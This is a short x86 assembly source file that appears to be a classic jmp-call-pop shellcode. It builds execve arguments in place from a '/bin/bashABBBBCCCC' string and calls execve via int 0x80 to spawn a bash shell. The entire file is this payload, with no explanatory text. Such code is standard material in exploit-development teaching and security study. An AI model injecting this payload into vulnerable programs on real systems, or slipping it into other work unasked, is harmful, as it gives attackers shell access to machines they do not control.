.text
.globl _start

_start:
        jmp callshell

        shellcode:
                popl %esi
                xorl %eax, %eax
                movb $0,%al
                movb %al,0x9(%esi)
                movl %esi,0xa(%esi)
                movl %eax,0xe(%esi)
                movb $11, %al
                movl %esi, %ebx
                leal 0xa(%esi),%ecx
                leal 0xe(%esi),%edx
                int $0x80

        callshell:
                call shellcode
                shellvariables:
                        .ascii "/bin/bashABBBBCCCC"
